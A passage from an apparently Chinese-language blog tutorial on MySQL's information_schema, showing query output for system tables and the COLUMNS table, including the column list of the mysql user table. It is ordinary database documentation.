Master Information                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_relay_log_info      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> Relay Log Information                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_worker_info         <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> Worker Information                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slow_log                  <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> CSV    <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Slow log                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> tables_priv               <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">239535205180768255</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Table</span> privileges                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone                 <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">1970324836974591</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>              <span class="number">1</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zones                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_leap_second     <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">3659174697238527</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Leap seconds information <span class="keyword">for</span> <span class="type">time</span> zones <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_name            <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>  <span class="number">55450570411999231</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone names                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_transition      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">4785074604081151</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone transitions                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_transition_type <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>  <span class="number">10696049115004927</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zone transition types              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">5</span> <span class="operator">|</span>             <span class="number">70</span> <span class="operator">|</span>         <span class="number">352</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">55</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Users <span class="keyword">and</span> <span class="keyword">global</span> privileges             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="number">28</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>###COLUMNS表<br><code>information_schema.COLUMNS</code>表提供了表中的<code>列</code>的信息，详细表述了某张表的所有列以及每个列的信息，是<code>show columns from [schemaname].[tablename]</code>的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> information_schema.COLUMNS;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field                    <span class="operator">|</span> Type                <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG            <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">512</span>)        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA             <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_NAME               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_NAME              <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ORDINAL_POSITION         <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">0</span>       <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_DEFAULT           <span class="operator">|</span> longtext            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> IS_NULLABLE              <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">3</span>)          <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_TYPE                <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_MAXIMUM_LENGTH <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_OCTET_LENGTH   <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> NUMERIC_PRECISION        <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> NUMERIC_SCALE            <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATETIME_PRECISION       <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHARACTER_SET_NAME       <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLLATION_NAME           <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_TYPE              <span class="operator">|</span> longtext            <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_KEY               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">3</span>)          <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> EXTRA                    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">30</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> PRIVILEGES               <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">80</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> COLUMN_COMMENT           <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">1024</span>)       <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">20</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>其中，对应<code>information_schema.Tables</code>，多出来的<code>COLUMN_NAME</code>为对应表中的列名。<br>如想查询表名为<code>user</code>的表中的所有列名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------------------+------------------+-----------------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+-----------------------------------+------------+-------+---------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG <span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME <span class="operator">|</span> COLUMN_NAME            <span class="operator">|</span> ORDINAL_POSITION <span class="operator">|</span> COLUMN_DEFAULT        <span class="operator">|</span> IS_NULLABLE <span class="operator">|</span> DATA_TYPE <span class="operator">|</span> CHARACTER_MAXIMUM_LENGTH <span class="operator">|</span> CHARACTER_OCTET_LENGTH <span class="operator">|</span> NUMERIC_PRECISION <span class="operator">|</span> NUMERIC_SCALE <span class="operator">|</span> DATETIME_PRECISION <span class="operator">|</span> CHARACTER_SET_NAME <span class="operator">|</span> COLLATION_NAME  <span class="operator">|</span> COLUMN_TYPE                       <span class="operator">|</span> COLUMN_KEY <span class="operator">|</span> EXTRA <span class="operator">|</span> PRIVILEGES                      <span class="operator">|</span> COLUMN_COMMENT <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+------------+------------------------+------------------+-----------------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+-----------------------------------+------------+-------+---------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Host                   <span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span>                       <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">char</span>      <span class="operator">|</span>                       <span class="number">60</span> <span class="operator">|</span>                    <span class="number">180</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_bin        <span class="operator">|</span> <span class="type">char</span>(<span class="number">60</span>)                          <span class="operator">|</span> PRI        <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> <span class="keyword">User</span>                   <span class="operator">|</span>                <span class="number">2</span> <span class="operator">|</span>                       <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">char</span>      <span class="operator">|</span>                       <span class="number">16</span> <span class="operator">|</span>                     <span class="number">48</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_bin        <span class="operator">|</span> <span class="type">char</span>(<span class="number">16</span>)                          <span class="operator">|</span> PRI        <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Password               <span class="operator">|</span>                <span class="number">3</span> <span class="operator">|</span>                       <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> <span class="type">char</span>      <span class="operator">|</span>                       <span class="number">41</span> <span class="operator">|</span>                     <span class="number">41</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> latin1             <span class="operator">|</span> latin1_bin      <span class="operator">|</span> <span class="type">char</span>(<span class="number">41</span>)                          <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Select_priv            <span class="operator">|</span>                <span class="number">4</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Insert_priv            <span class="operator">|</span>                <span class="number">5</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Update_priv            <span class="operator">|</span>                <span class="number">6</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Delete_priv            <span class="operator">|</span>                <span class="number">7</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Create_priv            <span class="operator">|</span>                <span class="number">8</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Drop_priv              <span class="operator">|</span>                <span class="number">9</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Reload_priv            <span class="operator">|</span>               <span class="number">10</span> <span class="operator">|</span> N                     <span class="operator">|</span> <span class="keyword">NO</span>          <span class="operator">|</span> enum      <span class="operator">|</span>                        <span class="number">1</span> <span class="operator">|</span>                      <span class="number">3</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>          <span class="keyword">NULL</span> <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span> utf8               <span class="operator">|</span> utf8_general_ci <span class="operator">|</span> enum(<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>)                     <span class="operator">|</span>            <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> <span class="keyword">user</span>       <span class="operator">|</span> Shutdown_priv          <span class="operator">|</span>               <span class="number">11</span> <span 